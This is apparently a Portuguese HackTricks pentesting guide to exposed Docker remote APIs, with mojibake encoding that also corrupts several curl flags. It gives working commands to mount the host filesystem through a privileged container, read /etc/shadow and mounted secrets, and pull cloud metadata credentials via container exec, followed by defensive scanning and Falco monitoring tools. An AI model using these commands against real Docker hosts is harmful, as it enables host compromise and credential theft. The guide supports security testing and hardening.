## 2375, 2376 Pentesting Docker

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o** [**repositÃ³rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositÃ³rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Conceitos bÃ¡sicos do Docker

### O que Ã©

A plataforma Docker Ã© a plataforma de contÃªiner lÃ­der do setor para inovaÃ§Ã£o contÃ­nua e de alta velocidade, permitindo que organizaÃ§Ãµes construam e compartilhem qualquer aplicativo - desde legados atÃ© o que vem a seguir - e executem com seguranÃ§a em qualquer lugar.

### Arquitetura bÃ¡sica do Docker

Essas informaÃ§Ãµes sÃ£o provenientes [daqui](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc).

* [containerd](http://containerd.io) Ã© um tempo de execuÃ§Ã£o de contÃªiner que pode **gerenciar todo o ciclo de vida do contÃªiner - desde a transferÃªncia/armazenamento de imagens atÃ© a execuÃ§Ã£o, supervisÃ£o e rede do contÃªiner**. **Mais informaÃ§Ãµes sobre o containerd abaixo.**
* container-shim lida com contÃªineres sem cabeÃ§a, o que significa que, uma vez que o runc inicializa os contÃªineres, ele sai entregando os contÃªineres ao container-shim, que age como um intermediÃ¡rio.
* [runc](http://runc.io) Ã© um tempo de execuÃ§Ã£o de contÃªiner universal e leve, que segue a especificaÃ§Ã£o OCI. **O runc Ã© usado pelo containerd para criar e executar contÃªineres de acordo com a especificaÃ§Ã£o OCI**. TambÃ©m Ã© o empacotamento do libcontainer.
* [grpc](http://www.grpc.io) usado para comunicaÃ§Ã£o entre o containerd e o docker-engine.
* [OCI](https://www.opencontainers.org) mantÃ©m a especificaÃ§Ã£o OCI para tempo de execuÃ§Ã£o e imagens. As versÃµes atuais do Docker suportam as especificaÃ§Ãµes de imagem e tempo de execuÃ§Ã£o OCI.

![runC, containerD](https://i.stack.imgur.com/5aXF6.png)

### Comandos bÃ¡sicos
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
### Containerd

O Containerd foi projetado para ser usado pelo Docker e Kubernetes, bem como por qualquer outra plataforma de contÃªiner que queira **abstrair syscalls ou funcionalidades especÃ­ficas do SO para executar contÃªineres** no Linux, Windows, Solaris ou outros SOs. Com esses usuÃ¡rios em mente, querÃ­amos ter certeza de que o containerd tem apenas o que eles precisam e nada que nÃ£o precisem. Realisticamente, isso Ã© impossÃ­vel, mas pelo menos Ã© o que tentamos fazer. Coisas como **rede estÃ£o fora do escopo do containerd**. A razÃ£o para isso Ã© que, ao construir um sistema distribuÃ­do, a rede Ã© um aspecto muito central. Com SDN e descoberta de serviÃ§o hoje, a rede Ã© muito mais especÃ­fica da plataforma do que abstrair chamadas netlink no Linux.

Observe que **o Docker usa o Containerd, mas ele fornece apenas um subconjunto dos recursos que o Docker fornece**. Portanto, por exemplo, o ContainerD nÃ£o possui recursos de gerenciamento de rede do Docker, nem vocÃª pode usar o ContainerD sozinho para criar enxames do Docker.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine 
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
### Podman

**InformaÃ§Ã£o** [**daqui**](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)

Podman Ã© um motor de contÃªineres de cÃ³digo aberto compatÃ­vel com OCI ([Open Container Initiative](https://github.com/opencontainers)). Ã‰ impulsionado pela Red Hat e incorpora algumas diferenÃ§as importantes do Docker, como sua arquitetura sem daemon e suporte para contÃªineres sem raiz. Em sua essÃªncia, **ambas as ferramentas fazem a mesma coisa: gerenciam imagens e contÃªineres**. Um dos **objetivos do Podman Ã© ter uma API compatÃ­vel com o Docker**. Portanto, quase todos os comandos da CLI (interface de linha de comando) do Docker tambÃ©m estÃ£o disponÃ­veis no Podman.

VocÃª pode encontrar outras duas ferramentas no ecossistema Podman: Buildah e Skopeo. Buildah Ã© uma ferramenta CLI usada para construir imagens de contÃªineres, e Skopeo Ã© uma ferramenta CLI para executar operaÃ§Ãµes em imagens, como push, pull ou inspect. [Por favor, verifique o GitHub](https://github.com/containers/buildah/tree/master/docs/containertools) para obter mais informaÃ§Ãµes sobre essas ferramentas e sua relaÃ§Ã£o com o Podman.

**As principais diferenÃ§as**

**A maior diferenÃ§a entre o Docker e o Podman Ã© sua arquitetura**. **O Docker** roda em uma arquitetura **cliente-servidor**, enquanto o **Podman** roda em uma arquitetura **sem daemon**. Mas o que isso significa? Ao trabalhar com o **Docker**, vocÃª precisa usar a CLI do Docker, que se comunica com um **daemon em segundo plano** (o daemon do Docker). A lÃ³gica principal reside no daemon, que constrÃ³i imagens e executa contÃªineres. Esse **daemon Ã© executado com privilÃ©gios de root**. A arquitetura do **Podman**, por outro lado, permite que vocÃª **execute os contÃªineres sob o usuÃ¡rio que estÃ¡ iniciando o contÃªiner** (fork/exec), e esse usuÃ¡rio nÃ£o precisa de nenhum privilÃ©gio de root. Como **o Podman tem uma arquitetura sem daemon, cada usuÃ¡rio que executa o Podman sÃ³ pode ver e modificar seus prÃ³prios contÃªineres**. NÃ£o hÃ¡ um daemon comum com o qual a ferramenta CLI se comunique.

Como o Podman nÃ£o tem um daemon, ele precisa de uma maneira de suportar a execuÃ§Ã£o de contÃªineres em segundo plano. Portanto, ele fornece uma integraÃ§Ã£o com o **systemd**, que permite controlar os contÃªineres por meio de unidades do systemd. Dependendo da versÃ£o do Podman, vocÃª pode gerar essas unidades para contÃªineres existentes ou gerar unidades que possam criar contÃªineres se eles nÃ£o existirem no sistema. HÃ¡ outro modelo de integraÃ§Ã£o com o systemd, que permite que o systemd seja executado dentro de um contÃªiner. Por padrÃ£o, o Docker usa o systemd para controlar o processo do daemon.

A segunda grande diferenÃ§a diz respeito Ã  forma como os contÃªineres sÃ£o executados. Com o **Podman**, **os contÃªineres sÃ£o executados sob os privilÃ©gios do usuÃ¡rio e nÃ£o sob o daemon**. Neste ponto, o conceito de contÃªineres sem raiz entra em jogo, o que significa que o contÃªiner pode ser iniciado sem privilÃ©gios de root. Os contÃªineres sem raiz tÃªm uma grande vantagem sobre os contÃªineres com raiz, uma vez que (vocÃª adivinhou) eles nÃ£o sÃ£o executados sob a conta root. O benefÃ­cio disso Ã© que, se um invasor conseguir capturar e escapar de um contÃªiner, esse invasor ainda serÃ¡ um usuÃ¡rio normal no host. Os contÃªineres iniciados por um usuÃ¡rio nÃ£o podem ter mais privilÃ©gios ou capacidades do que o prÃ³prio usuÃ¡rio. Isso adiciona uma camada natural de proteÃ§Ã£o.

{% hint style="info" %}
Observe que, como o Podman visa suportar a mesma API que o Docker, vocÃª pode usar os mesmos comandos com o Podman como com o Docker, como:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

## InformaÃ§Ãµes bÃ¡sicas

A API remota Ã© executada por padrÃ£o na porta 2375 quando habilitada. O serviÃ§o por padrÃ£o nÃ£o exigirÃ¡ autenticaÃ§Ã£o, permitindo que um invasor inicie um contÃªiner docker privilegiado. Ao usar a API remota, Ã© possÃ­vel anexar hosts / (diretÃ³rio raiz) ao contÃªiner e ler/escrever arquivos do ambiente do host. 

**Porta padrÃ£o:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
## EnumeraÃ§Ã£o

### Manual

Observe que, para enumerar a API do Docker, vocÃª pode usar o comando `docker` ou `curl`, como no exemplo a seguir:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
 Version:           19.03.1
 API version:       1.40
 Go version:        go1.12.5
 Git commit:        74b1e89
 Built:             Thu Jul 25 21:21:05 2019
 OS/Arch:           linux/amd64
 Experimental:      false

Server: Docker Engine - Community
 Engine:
  Version:          19.03.1
  API version:      1.40 (minimum version 1.12)
  Go version:       go1.12.5
  Git commit:       74b1e89
  Built:            Thu Jul 25 21:19:41 2019
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.2.6
  GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
 runc:
  Version:          1.0.0-rc8
  GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
 docker-init:
  Version:          0.18.0
  GitCommit:        fec3683
```
Se vocÃª pode **acessar a API remota do Docker com o comando `docker`**, vocÃª pode **executar** qualquer um dos [**comandos do Docker** mencionados anteriormente](2375-pentesting-docker.md#basic-commands) para interagir com o serviÃ§o.

{% hint style="info" %}
VocÃª pode `export DOCKER_HOST="tcp://localhost:2375"` e **evitar** o uso do parÃ¢metro `-H` com o comando docker.
{% endhint %}

#### Escalada rÃ¡pida de privilÃ©gios
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
Ã€s vezes vocÃª verÃ¡ a porta **2376** aberta para o endpoint **TLS**. Eu nÃ£o consegui me conectar a ela com o cliente docker, mas vocÃª pode fazÃª-lo facilmente com o curl para acessar a API do docker.
```bash
#List containers
curl â€“insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl â€“insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s â€“insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl â€“insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, itâ€™s also worth checking out services in case they are adding secrets via environment variables)
curl -s â€“insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl â€“insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl â€“insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
Se vocÃª quiser mais informaÃ§Ãµes sobre isso, mais informaÃ§Ãµes estÃ£o disponÃ­veis de onde eu copiei os comandos: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
## Comprometendo

Na pÃ¡gina a seguir, vocÃª pode encontrar maneiras de **escapar de um contÃªiner Docker**:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

Abusando disso, Ã© possÃ­vel escapar de um contÃªiner. VocÃª pode executar um contÃªiner fraco na mÃ¡quina remota, escapar dele e comprometer a mÃ¡quina:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

## Escalada de privilÃ©gios

Se vocÃª estiver dentro de um host que estÃ¡ usando o Docker, vocÃª pode [**ler esta informaÃ§Ã£o para tentar elevar privilÃ©gios**](../linux-hardening/privilege-escalation/#writable-docker-socket).

## Descobrindo segredos em contÃªineres Docker em execuÃ§Ã£o
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
Verifique a seÃ§Ã£o **env** (variÃ¡veis de ambiente) em busca de segredos e vocÃª pode encontrar:

* Senhas.
* IPs.
* Portas.
* Caminhos.
* Outros...

Se vocÃª quiser extrair um arquivo:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
## SeguranÃ§a do seu Docker

### InstalaÃ§Ã£o e uso seguro do Docker

* VocÃª pode usar a ferramenta [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) para inspecionar sua instalaÃ§Ã£o atual do Docker.
  * `./docker-bench-security.sh`
* VocÃª pode usar a ferramenta [https://github.com/kost/dockscan](https://github.com/kost/dockscan) para inspecionar sua instalaÃ§Ã£o atual do Docker.
  * `dockscan -v unix:///var/run/docker.sock`
* VocÃª pode usar a ferramenta [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) para verificar os privilÃ©gios que um contÃªiner terÃ¡ quando executado com diferentes opÃ§Ãµes de seguranÃ§a. Isso Ã© Ãºtil para saber as implicaÃ§Ãµes do uso de algumas opÃ§Ãµes de seguranÃ§a para executar um contÃªiner:
  * `docker run --rm -it r.j3ss.co/amicontained`
  * `docker run --rm -it --pid host r.j3ss.co/amicontained`
  * `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

### SeguranÃ§a de imagens do Docker

* VocÃª pode usar uma imagem do Docker de [https://github.com/quay/clair](https://github.com/quay/clair) para fazer a varredura de suas outras imagens do Docker e encontrar vulnerabilidades.
  * `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
  * `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

### SeguranÃ§a de Dockerfiles

* VocÃª pode usar a ferramenta [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) para **inspecionar seu Dockerfile** e encontrar todos os tipos de configuraÃ§Ãµes incorretas. Cada configuraÃ§Ã£o incorreta receberÃ¡ um ID, vocÃª pode encontrar aqui [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) como corrigir cada uma delas.
  * `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (418).png>)

* VocÃª pode usar a ferramenta [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) para **inspecionar seu Dockerfile** e encontrar todos os tipos de configuraÃ§Ãµes incorretas.
  * `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (419).png>)

* VocÃª pode usar a ferramenta [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) para **inspecionar seu Dockerfile** e encontrar todos os tipos de configuraÃ§Ãµes incorretas.
  * `dockerlint Dockerfile`

![](<../.gitbook/assets/image (420).png>)

* VocÃª pode usar a ferramenta [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) para **inspecionar seu Dockerfile** e encontrar todos os tipos de configuraÃ§Ãµes incorretas.
  * `hadolint Dockerfile`

![](<../.gitbook/assets/image (421).png>)

### Registro de atividades suspeitas

* VocÃª pode usar a ferramenta [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) para detectar **comportamentos suspeitos em contÃªineres em execuÃ§Ã£o**.
  * Observe no seguinte trecho como o **Falco compila um mÃ³dulo do kernel e o insere**. Depois disso, ele carrega as regras e **comeÃ§a a registrar atividades suspeitas**. Neste caso, ele detectou 2 contÃªineres privilegiados iniciados, 1 deles com um ponto de montagem sensÃ­vel, e apÃ³s alguns segundos ele detectou como um shell foi aberto dentro de um dos contÃªineres.
```
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
 - Original module
   - No original module exists within this kernel
 - Installation
   - Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
### Monitorando Docker

VocÃª pode usar o auditd para monitorar o Docker.
